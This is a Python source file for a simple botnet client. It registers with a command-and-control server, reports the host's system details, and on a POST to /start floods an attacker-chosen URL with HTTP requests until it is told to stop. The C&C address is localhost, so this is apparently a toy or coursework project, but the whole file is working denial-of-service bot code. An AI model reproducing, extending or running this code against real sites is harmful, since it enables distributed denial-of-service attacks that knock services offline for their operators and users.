import atexit
import contextlib
import platform
import threading
import requests
import socket
import json

from http.server import BaseHTTPRequestHandler, HTTPServer


class Bot(BaseHTTPRequestHandler):
    status = {'action': 'Idle', 'targets': []}
    lock = threading.Lock()
    stop = threading.Event()

    def __response_body(self, func):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes(json.dumps(func()), "utf-8"))

    def do_GET(self):
        if self.path == '/info':
            self.__response_body(self.__info)

        elif self.path == '/status':
            self.__response_body(self.__status)

        elif self.path == '/stop':
            self.send_response(200)
            self.end_headers()
            self.stop.set()

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/start':
            length = int(self.headers['Content-Length'])
            payload = json.loads(self.rfile.read(length).decode('utf-8'))

            attack = threading.Thread(target=Bot.__attack, args=(self, payload['url'], self.stop))
            attack.start()
            self.send_response(200)
        else:
            self.send_response(404)

        self.end_headers()

    def __info(self):
        info = platform.uname()._asdict()
        info['processor'] = platform.processor()
        return info

    def __status(self):
        with self.lock:
            return self.status

    def __attack(self, url, stop: threading.Event):
        with self.lock:
            self.status['action'] = "Attacking"
            self.status['targets'].append(url)

        while not stop.is_set():
            print(f"Request sent, status code:{requests.get(url).status_code}")

        stop.clear()
        with self.lock:
            self.status['action'] = "Idle"
            self.status['targets'].clear()


CNC_ADDR = "127.0.0.1"
CNC_PORT = 60000


def start(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((CNC_ADDR, CNC_PORT))
        s.send(str(port).encode('utf-8'))


def exit_handler():
    with contextlib.suppress(ConnectionRefusedError):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((CNC_ADDR, CNC_PORT))


if __name__ == '__main__':
    server_port = 8080

    bot = HTTPServer(('', server_port), Bot)

    try:
        start(server_port)
        print("Connected to the Command & Control")
        atexit.register(exit_handler)
        bot.serve_forever()
    except ConnectionRefusedError as e:
        print("Cannot establish the connection to Command & Control")
    except KeyboardInterrupt as e:
        pass
    finally:
        print("Closing program...")
